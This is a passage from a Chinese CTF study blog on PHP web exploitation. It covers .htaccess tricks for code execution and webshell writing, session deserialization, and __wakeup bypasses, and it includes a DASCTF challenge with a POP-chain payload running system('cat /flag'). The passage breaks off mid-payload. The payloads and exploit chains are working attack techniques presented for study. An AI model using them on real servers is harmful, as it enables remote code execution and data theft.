src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122210912.png" alt="image-20230903122210912"></p><p>太神奇了</p><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p><code>php_flag engine 0</code></p><p>在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122346792.png" alt="image-20230903122346792"></p><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>条件：<code>all_url_fopen=on</code>,<code>all_url_include=on</code></p><div class="code-wrapper"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_append_file data:<span class="hljs-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></code></pre></div><h4 id="解析-htaccess"><a href="#解析-htaccess" class="headerlink" title="解析.htaccess"></a>解析.htaccess</h4><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_append_file .htaccess</span><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span></code></pre></div><p><code>&lt;?php phpinfo();?&gt;</code>会被解析</p><p>这种方法在我们随便打开一个PHP文件后就会去解析.htaccess文件（这里的htaccess文件一定要和php文件在一个目录下！！！！）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122707190.png" alt="image-20230903122707190"></p><p>二</p><p>这种适合同目录或子目录没有<code>php</code>文件。<br>需要先设置允许可访问 <code>.htaccess</code> 文件</p><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> ~ &quot;^<span class="hljs-attr">.ht</span>&quot;&gt;</span></span><span class="language-xml"> Require all granted</span><span class="language-xml"> Order allow,deny</span><span class="language-xml"> Allow from all</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span></span><span class="language-xml">SetHandler application/x-httpd-php</span><span class="language-xml"># </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span></code></pre></div><p>上面的代码必须加，是允许访问htaccess文件</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="cgi"><a href="#cgi" class="headerlink" title="cgi"></a>cgi</h5><p><code>cgi_module</code> 需要加载，即 <code>apache</code> 配置文件中有</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> cgi_module modules/mod_cgi.so</code></pre></div><p>.htaccess内容</p><div class="code-wrapper"><pre><code class="hljs mipsasm">Options ExecCGI <span class="hljs-comment">#允许CGI执行</span><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xx <span class="hljs-comment">#将xx后缀名的文件，当做CGI程序进行解析</span></code></pre></div><p>ce.xx</p><div class="code-wrapper"><pre><code class="hljs d"><span class="hljs-meta">#!C:/Windows/System32/cmd.exe /k start calc.exe</span><span class="hljs-number">6</span></code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903123655129.png" alt="image-20230903123655129"></p><h5 id="fastcgi-（百闻不如一见）"><a href="#fastcgi-（百闻不如一见）" class="headerlink" title="fastcgi     （百闻不如一见）"></a>fastcgi     （百闻不如一见）</h5><p><code>mod_fcgid.so</code>需要被加载。即 <code>apache</code> 配置文件中有</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> fcgid_module modules/mod_fcgid.so</code></pre></div><p>.htaccess</p><div class="code-wrapper"><pre><code class="hljs jboss-cli">Options +ExecCGIAddHandler fcgid-script <span class="hljs-string">.xx</span>FcgidWrapper <span class="hljs-string">&quot;C:/Windows/System32/cmd.exe /k start calc.exe&quot;</span> <span class="hljs-string">.xx</span></code></pre></div><p>ce.xx 内容随意  （所以叫fast）</p><h4 id="自定义错误文件-（不太理解）"><a href="#自定义错误文件-（不太理解）" class="headerlink" title="自定义错误文件   （不太理解）"></a>自定义错误文件   （不太理解）</h4><p><code>error.php</code></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;shell&#x27;</span>);<span class="hljs-comment">#报错页面</span></code></pre></div><p><code>.htaccess</code></p><div class="code-wrapper"><pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/tmp/</span>www<span class="hljs-regexp">/html/</span>shell.php php_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span></code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903124241964.png" alt="image-20230903124241964"></p><p>会经过 html 编码，所以需要 UTF-7 来绕过。</p><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># 第一次</span>php_value error_log <span class="hljs-keyword">/tmp/</span>shell <span class="hljs-meta">#定义错误路径</span><span class="hljs-meta">#---- <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span> in UTF-7:</span>php_value include_path <span class="hljs-string">&quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><span class="hljs-meta"># 第二次</span>php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span> <span class="hljs-meta">#将<span class="hljs-keyword">include</span>()的默认路径改变</span>php_flag zend.multibyte <span class="hljs-number">1</span>php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre></div><p><a href="https://www.cnblogs.com/tr1ple/p/11439994.html">X-NUCA-ezphp</a></p><h2 id="session-serialize-handler-三种引擎"><a href="#session-serialize-handler-三种引擎" class="headerlink" title="session.serialize_handler(三种引擎)"></a>session.serialize_handler(三种引擎)</h2><div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">php</span>(默认的）键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值php_binary   键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的值php_serialize (php&gt;=<span class="hljs-number">5.5</span>.<span class="hljs-number">4</span>)经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的数组</code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144909405.png" alt="image-20230903144909405"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144926904.png" alt="image-20230903144926904"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144942736.png" alt="image-20230903144942736"></p><p>当一个服务器（session文件和PHPSESSID相同），的两个页面使用不同处理器就会存在phpsession反序列化漏洞</p><h2 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session_upload_progress进行文件包含***"></a>利用session_upload_progress进行文件包含***</h2><p>挺重要的一个考点</p><p>原理看过很多次，但感觉要是遇到的话还是很迷茫,找不到题目,实际操作一次就会很清醒了）</p><p>这个似懂非懂就不写了</p><p>但真的非常重要</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php的__wakeup绕过</title>
    <link href="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/"/>
    <url>/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h1><h2 id="cve-2016-7124"><a href="#cve-2016-7124" class="headerlink" title="cve-2016-7124"></a>cve-2016-7124</h2><p>影响范围：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><blockquote><p>如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。</p></blockquote><p>听名字很高大上，其实就是最常用的修改数字</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903185255743.png" alt="image-20230903185255743"></p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903185345104.png" alt="image-20230903185345104"></p><h2 id="php引用赋值"><a href="#php引用赋值" class="headerlink" title="php引用赋值&amp;"></a>php引用赋值&amp;</h2><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903185722842.png" alt="image-20230903185722842"></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$a</span></span>)</span>&#123;     <span class="hljs-variable">$x</span>=&amp;<span class="hljs-variable">$a</span>;           <span class="hljs-comment">###共用一个地址</span>    <span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;123&#x27;</span>;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;11&#x27;</span>;<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>示例</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyPort</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;key=False;        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;wakeup)||!<span class="hljs-variable language_">$this</span>-&gt;wakeup)&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You get it!&quot;</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;wakeup=True;    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyPort</span>();<span class="hljs-variable">$a</span>-&gt;key = &amp;<span class="hljs-variable">$a</span>-&gt;wakeup;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903190353939.png" alt="image-20230903190353939"></p><h3 id="值恒相等"><a href="#值恒相等" class="headerlink" title="值恒相等"></a>值恒相等</h3><p>我记得好像见过要令两个值相等，但又不能赋值的情况（遇到再说吧）</p><p><code>$this→b = &amp;$this→a</code></p><h2 id="fast-destruct-（也能绕throws-new-Error）"><a href="#fast-destruct-（也能绕throws-new-Error）" class="headerlink" title="fast destruct  （也能绕throws new Error）"></a>fast destruct  （也能绕throws new Error）</h2><h3 id="追加总结，fast-destruct是绕过别的类里面的-wakeup，同一个类中的-destruct始终在同一个类中的-wakup之后执行"><a href="#追加总结，fast-destruct是绕过别的类里面的-wakeup，同一个类中的-destruct始终在同一个类中的-wakup之后执行" class="headerlink" title="追加总结，fast destruct是绕过别的类里面的__wakeup，同一个类中的__destruct始终在同一个类中的__wakup之后执行"></a>追加总结，fast destruct是绕过别的类里面的<code>__wakeup</code>，同一个类中的<code>__destruct</code>始终在同一个类中的<code>__wakup</code>之后执行</h3><ul><li>在PHP中如果单独执行<code>unserialize()</code>函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行<code>__destruct()</code>方法</li><li>而如果将<code>unserialize()</code>函数执行后得到的字符串<strong>赋值给了一个变量</strong>，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行析构方法</li></ul><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$a</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);      <span class="hljs-comment">##特征</span></code></pre></div><h3 id="在我看来，fast-destruct的原理就是利用反序列化字符串报错"><a href="#在我看来，fast-destruct的原理就是利用反序列化字符串报错" class="headerlink" title="在我看来，fast destruct的原理就是利用反序列化字符串报错"></a>在我看来，fast destruct的原理就是利用反序列化字符串报错</h3><div class="code-wrapper"><pre><code class="hljs css">正常反序列化的结果:a:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;classes&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#125;------------------------------------------------------------<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;classes&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;     #减少末尾的&#125;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;classes&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#125;     #改变类属性的个数<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;classes&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;;&#125;    #后面插入个;号</code></pre></div><p>(第二种那不就变得跟cve-2016那个一样了吗)</p><p>理论上只要不破坏链条的基本结构，其他的地方你随便改，使它报错即可</p><hr><p>DASCTF X GFCTF 2022十月挑战赛 easypop</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fine</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$content</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-variable">$cmd</span>;        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-variable">$content</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;cmd, <span class="hljs-variable">$this</span>-&gt;content);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctf</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$time</span> = <span class="hljs-string">&quot;Two and a half years&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ctf</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;ctf = <span class="hljs-variable">$ctf</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;ctf-&gt;<span class="hljs-title function_ invoke__">show</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>): <span class="hljs-title">string</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;ctf . <span class="hljs-string">&quot;: Duration of practice: &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;time;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sorry</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hint</span> = <span class="hljs-string">&quot;hint is depend on you&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$password</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;hint = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">secret_code</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$name</span> = <span class="hljs-variable language_">$this</span>-&gt;key;        <span class="hljs-variable">$name</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password == <span class="hljs-variable language_">$this</span>-&gt;name) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hint;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&quot;jay&quot;</span>) &#123;            secret_code::<span class="hljs-title function_ invoke__">secret</span>();        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is our code&quot;</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPassword</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;password;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setPassword</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>): <span class="hljs-title">void</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret_code</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$code</span>;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">secret</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;hint.php&quot;</span>;        <span class="hljs-title function_ invoke__">hint</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$num</span> = <span class="hljs-variable">$name</span>;        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$num</span>();    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;code-&gt;secret;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);    <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">setPassword</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>()));&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>(<span class="hljs-string">&quot;Ctfer&quot;</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fine</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;system&quot;</span>;        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;ls /&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctf</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$time</span> = <span class="hljs-string">&quot;Two and a half years&quot;</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sorry</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hint</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret_code</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;&#125;<span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sorry</span>();<span class="hljs-variable">$d</span>-&gt;key = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fine</span>();<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">secret_code</span>();<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>();<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sorry</span>();<span class="hljs-variable">$a</span>-&gt;hint = <span class="hljs-variable">$b</span>;<span class="hljs-variable">$b</span>-&gt;ctf = <span class="hljs-variable">$c</span>;<span class="hljs-variable">$c</span>-&gt;code = <span class="hljs-variable">$d</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">##</span>O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sorry&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;show&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ctf&quot;</span>;O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;secret_code&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sorry&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fine&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;r:<span class="hljs-number">10</span>;&#125;&#125;&#125;</code></pre></div><p>pop链就不讲了（还是有难度的，因为我对private等的理解不够）</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>:<span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sorry&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;show&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ctf&quot;</span>;O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;secret_code&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sorry&quot;</span>:<span 